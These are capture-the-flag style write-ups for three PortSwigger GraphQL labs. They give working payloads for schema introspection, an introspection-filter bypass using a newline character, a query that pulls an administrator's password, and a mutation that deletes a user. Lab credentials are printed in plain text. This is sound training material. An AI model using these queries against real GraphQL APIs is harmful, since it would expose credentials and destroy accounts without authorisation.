## Accessing private GraphQL posts
[Accessing private GraphQL posts](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)

Write-up: 
1. We need to get the password of the hidden blog post. Intercepting the request to / shows us a POST request to /graphql/v1: <br>
   
    ```
    {"query":"\nquery getBlogSummaries {\n    getAllBlogPosts {\n        image\n        title\n        summary\n        id\n    }\n}","operationName":"getBlogSummaries"}
    ``` 

    We can see by the response to this request that the post with id=3 isn't being displayed.

2. Using introspection, we can find more about the schema:

    `"query": "query { __schema { types { name fields { name } } } }"`

    We discover a getBlogPost query, as well as a postPassword field.

3. To find out more about the getBlogPost query, we use:

    ```
    {
    "query": "query { __type(name: \"query\") { fields { name args { name type { kind name ofType { kind name } } } type { kind name ofType { kind name } } } } }"
    }

    ```

4. Using the new information we got, we can craft a request to get us the missing post:

    ```
    {
    "query": "query getBlogPostById($id: Int!) { getBlogPost(id: $id) { image title summary id postPassword } }",
    "operationName": "getBlogPostById",
    "variables": { "id": 3 }
    }
    ```

    This reveals the password: **l58w5rj7y2lqog9oqpgautmrocsirx7r**

## Accidental exposure of private GraphQL fields
[Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)

Write-up:
1. Using introspection, we can find more about the schema:

    `"query": "query { __schema { types { name fields { name } } } }"`

    We discover a getUser query and a User object.

2. To get more information about User we use:

    ```
    {"query":"{ __type(name: \"User\") { name fields { name type { name kind ofType { name kind } } } } }"}
    ```

    This shows us User object has id, username and password.

3. To get admin details:

    `{"query":"query { getUser(id: 1) { id username password } }"}`

    This shows credentials **administrator:6fegsn30pc958nfulcl8**

4. Logging in gives us access to admin panel which allows us to selete user **carlos** and solve the lab.

## Finding a hidden GraphQL endpoint
[Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)

Write-up:
1. Attempting to access some common locations for GraphQL endpoints makes us find /api,
which returns a JSON with "Query not present".

2. Attempting to access **/api?query={__schema{queryType{name}}}** returns "GraphQL introspection is not allowed, but the query contained __schema or __type".

3. To bypass, we use `GET /api?query={__schema%0A{types{name,kind,fields{name,type{name,kind}}}}}` and we find a deleteOrganizationUser mutation. <br>

    ```
    GET /api?query=query%7B__type%0A(name:%22mutation%22)%7Bfields%7Bname%20args%7Bname%20type%7Bname%20kind%20ofType%7Bname%20kind%7D%7D%7D%20type%7Bname%20kind%7D%7D%7D%7D
    ``` 

    This shows us there are objects called DeleteOrganizationUserInput and DeleteOrganizationUserResponse.

    ```
    GET /api?query=query%7B__type%0A(name:%22DeleteOrganizationUserInput%22)%7Bname%20kind%20inputFields%7Bname%20type%7Bname%20kind%20ofType%7Bname%20kind%7D%7D%7D%7D%7D
    ```

    We find out that this object takes in the user id as a parameter.

4. We need to find carlos' user id. Iterating from 1 to 3 shows us that carlos has id=3.

    ```
    GET /api?query=query%7BgetUser(id:3)%7Bid%20username%7D%7D
    ```

5. This payload deletes user carlos and completes the lab:

    ```
    GET /api?query=mutation%0A%7BdeleteOrganizationUser(input:%7B%20id:3%20%7D)%20%7Buser%20%7Bid%20username%7D%7D%7D
    ```
